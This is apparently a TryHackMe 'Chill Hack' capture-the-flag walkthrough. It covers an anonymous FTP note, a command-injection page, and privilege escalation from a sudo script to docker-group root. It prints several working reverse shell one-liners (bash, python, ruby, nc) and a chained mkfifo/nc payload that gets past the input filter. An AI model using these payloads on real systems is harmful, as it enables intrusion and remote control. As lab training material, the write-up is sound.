# TryHackMe-Chill Hack

## NMAP

```
Nmap scan report for 10.10.244.249                                                                                                             [4/7]
Host is up (0.41s latency).          
Not shown: 997 closed ports          
PORT   STATE SERVICE VERSION                                              
21/tcp open  ftp     vsftpd 3.0.3                                         
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                    
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt                                                                                  
| ftp-syst:                                                               
|   STAT:                                                                 
| FTP server status:                                                      
|      Connected to ::ffff:10.2.54.209                                    
|      Logged in as ftp                                                   
|      TYPE: ASCII                   
|      No session bandwidth limit                                                                                                                   
|      Session timeout in seconds is 300                                  
|      Control connection is plain text                                                                                                             
|      Data connections will be plain text                                                                                                          
|      At session startup, client count was 2                                                                                                       
|      vsFTPd 3.0.3 - secure, fast, stable                                
|_End of status                                                           
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                   
| ssh-hostkey:                                                                                                                                      
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)                                                                                      
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)                                                                                     
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)                                                                                   
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                                                 
|_http-server-header: Apache/2.4.29 (Ubuntu)                              
|_http-title: Game Info              
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 68.20 seconds                
```

## PORT 80

<img src="https://imgur.com/OtBH9Y6.png"/>

## PORT 21

We see from the nmap results that `anonymous` login on ftp is enabled ,

<img src="https://imgur.com/4K8BMn3.png"/>


We can only find a `note.txt`  file

<img src="https://imgur.com/iwaYiYw.png"/>

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
By reading this we can assume that there are two users `anurodh` and `appar`.

## Gobuster

Let's do a directory brute force on the web page

<img src="https://imgur.com/1hGSpry.png"/>

We are presented a page where we can input something and it's always good to try some system commands to check if there exists `RCE` (Remote Code Execution)

So I'll try running a command `pwd` which will print the current working directory 

<img src="https://imgur.com/FlfoNYa.png"/>

And it does work so let's try to input a reverse shell command so that we may get our intial foothold.But problem is that it's filtering the input so if we try to input something malicious it's going to filter that out like ruuning these reverse shells

```
bash -i >& /dev/tcp/10.2.54.209/2222 0>&1

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.54.209",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])

ruby -rsocket -e'f=TCPSocket.open("10.2.54.209",2222).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

nc -e /bin/sh 10.2.54.209 4444
```

But if we combine commands togther like 

`pwd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.54.209 2222 >/tmp/f`

<img src="https://imgur.com/oUc9m40.png"/>

We are in the box as `www-data`

Running `sudo -l` will tell us that what we could run as other user or as root so in this case we run a file as user `apaar`

<img src="https://imgur.com/YJY6dWn.png"/>
Now before running it let's see what the script does

<img src="https://imgur.com/wvirJ0l.png"/>

So It's going to take two inputs first input `$person` would mean nothing it can be random string since it is only being printed another input `$msg` will goto a command `$msg 2>/dev/null` so we can try running a command like `cat local.txt` which is our user flag and it's going to redirect any output errors to null so basically we can run any command as user `apaar`

<img src="https://imgur.com/6Xu0rP7.png"/>

Try running `/bin/sh` to see if it get a shell as  `appar`

<img src="https://imgur.com/TAmZVeu.png"/>

Transfer `linpeas` on the box

<img src="https://imgur.com/eq09ZT3.png"/>

Running linepeas I didn't find much but saw that there are two ports on localhost 3306 which is `mysql` and `9001` which we can acess through ssh portforwarding

Before doing that let's generate a public and private key for ssh for that use `ssh-keygen` then copy the contents of `id_rsa.pub` into `authorized_keys`

<img src="https://imgur.com/aA7VQwG.png"/>

`ssh -L 9001:localhost:9001 apaar@10.10.165.124 -i id_rsa`

After doing that we can visit that port

<img src="https://imgur.com/SYdewr2.png"/>

Let's visit `var/www`

<img src="https://imgur.com/ce4PJod.png"/>

The step for ssh portforwarding wasn't needed as we could have just grab that picture or visted the page `/hacker.php` and it's uselsess to go for finding mysql username and password as it is just a rabbit hole I would say it was waste of time 

<img src="https://imgur.com/XYUv8OC.png"/>

Anyway,

<img src="https://imgur.com/un8Pfhk.png"/>

<img src="https://imgur.com/o8lpV87.png"/>

And this archive is password protected so we have to use a password cracking tool , the one that I use is called `fcrackzip`

<img src="https://imgur.com/2x0tUxb.png"/>

On reading that extract source code file we can fine a base64 enconded text which could be a user password

<img src="https://imgur.com/agdhwta.png"/>

And we are now logged in as `anurodh`  and we can see that this user is in the group of `docker`

<img src="https://imgur.com/ShIc4XA.png"/>

Looking at privilege escalation for docker on `GTFOBINS`

<img src="https://imgur.com/GDBVmQY.png"/>

We are root !!!